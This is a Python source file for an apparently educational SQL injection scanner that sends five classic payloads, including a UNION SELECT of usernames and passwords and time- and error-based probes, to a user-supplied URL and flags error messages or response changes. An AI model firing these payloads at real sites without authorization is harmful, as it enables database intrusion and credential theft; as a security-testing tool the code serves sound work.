import requests
from urllib.parse import urljoin
import re
import logging
from app import socketio

class SQLiSimulator:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL, username, password FROM users --",
            "' AND SLEEP(2) --",  # Time-based
            "' AND 1=CONVERT(int, @@version) --"  # Error-based
        ]
        
    def emit_log(self, message):
        """Emit log message to connected clients"""
        try:
            socketio.emit('log_message', {'message': message})
        except Exception as e:
            self.logger.error(f"Error emitting log: {str(e)}")
            
    def test_endpoint(self, target_url, param_name="id"):
        """Test SQL injection vulnerabilities on a target URL"""
        results = []
        self.emit_log(f"Starting SQL injection tests on {target_url}")
        
        # Ensure URL has proper scheme
        if not target_url.startswith(('http://', 'https://')):
            target_url = f'http://{target_url}'
            self.emit_log(f"Added HTTP scheme: {target_url}")
            
        try:
            # Test baseline response
            self.emit_log("Getting baseline response...")
            baseline = requests.get(target_url, timeout=5)
            baseline_length = len(baseline.text)
            self.emit_log(f"Baseline response length: {baseline_length} bytes")
            
            results.extend([
                f"Testing SQL Injection vulnerabilities on {target_url}",
                "=" * 50,
                f"Baseline response length: {baseline_length} bytes\n"
            ])
            
            for payload in self.payloads:
                self.emit_log(f"Testing payload: {payload}")
                results.extend([f"\nTesting payload: {payload}", "-" * 30])
                
                # Test GET parameter
                test_url = f"{target_url}?{param_name}={payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    # Check for common SQL error messages
                    sql_errors = [
                        "sql syntax", "mysql_fetch", "ORA-",
                        "SQL Server", "mysqli_fetch", "PostgreSQL"
                    ]
                    
                    for err in sql_errors:
                        if err.lower() in response.text.lower():
                            msg = "! SQL Error detected - Potential vulnerability!"
                            self.emit_log(msg)
                            results.append(msg)
                            break
                    
                    # Check for significant response length difference
                    diff = abs(len(response.text) - baseline_length)
                    if diff > 100:
                        msg = f"! Response length changed by {diff} bytes"
                        self.emit_log(msg)
                        results.append(msg)
                    
                    # Educational notes
                    if "UNION SELECT" in payload:
                        self.emit_log("Educational note: UNION-based injection detected")
                        results.append("Note: UNION-based payloads can extract data from other tables")
                    elif "SLEEP" in payload:
                        self.emit_log("Educational note: Time-based injection detected")
                        results.append("Note: Time-based payloads help detect blind SQLi")
                    elif "CONVERT" in payload:
                        self.emit_log("Educational note: Error-based injection detected")
                        results.append("Note: Error-based payloads force database errors to leak info")
                        
                except requests.exceptions.Timeout:
                    if "SLEEP" in payload:
                        msg = "! Timeout occurred - Potential time-based SQLi!"
                        self.emit_log(msg)
                        results.append(msg)
                except requests.exceptions.RequestException as e:
                    msg = f"Error testing payload: {str(e)}"
                    self.emit_log(msg)
                    results.append(msg)
            
            self.emit_log("SQL injection testing completed")
            socketio.emit('scan_complete', {'message': 'SQL Injection testing completed'})
            results.append("\nReminder: Only test on authorized systems!")
            return "\n".join(results)
            
        except Exception as e:
            self.logger.error(f"SQLi testing error: {str(e)}")
            error_msg = f"Error during SQLi testing: {str(e)}"
            self.emit_log(error_msg)
            return error_msg